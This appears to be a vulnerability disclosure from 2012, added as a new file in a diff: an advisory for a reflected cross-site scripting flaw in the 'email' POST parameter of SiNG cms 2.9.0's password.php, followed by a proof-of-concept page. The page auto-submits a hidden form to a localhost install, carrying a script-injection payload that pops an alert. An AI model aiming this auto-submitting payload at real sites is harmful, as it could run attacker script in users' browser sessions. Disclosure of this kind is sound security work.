@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<!--
+
+SiNG cms 2.9.0 (email) Remote XSS POST Injection Vulnerability
+
+
+Vendor: Simple Network Gear
+Product web page: http://www.sing-cms.ru
+Affected version: 2.9.0
+
+Summary: SiNG cms is a free modular Content Management System open
+source, based on a bunch of PHP / MySQL and intended use of the web
+server Apache.
+
+Desc: The application is prone to a reflected cross-site scripting
+vulnerability due to a failure to properly sanitize user-supplied
+input to the 'email' POST parameter in the 'password.php' script.
+Attackers can exploit this weakness to execute arbitrary HTML and
+script code in a user's browser session.
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+           Apache 2.4.2 (Win32)
+           PHP 5.4.4
+           MySQL 5.5.25a
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Vendor status:
+
+[20.08.2012] Vulnerability discovered.
+[20.08.2012] Initial contact with the vendor.
+[22.08.2012] No response from the vendor.
+[23.08.2012] Public security advisory released.
+
+
+Advisory ID: ZSL-2012-5097
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5097.php
+
+
+20.08.2012
+
+-->
+
+
+<html>
+<head>
+<title>SiNG cms 2.9.0 (email) Remote XSS POST Injection Vulnerability</title>
+</head>
+<body>
+<form name="email" method="post" action="http://localhost/singcms/password.php">
+<input type="hidden" name="email" value='"><script>alert("XSS");</script>' />
+<input type="hidden" name="send" value="Send password" />
+</form>
+<script type="text/javascript">
+document.email.submit();
+</script>
+</body>
+</html>
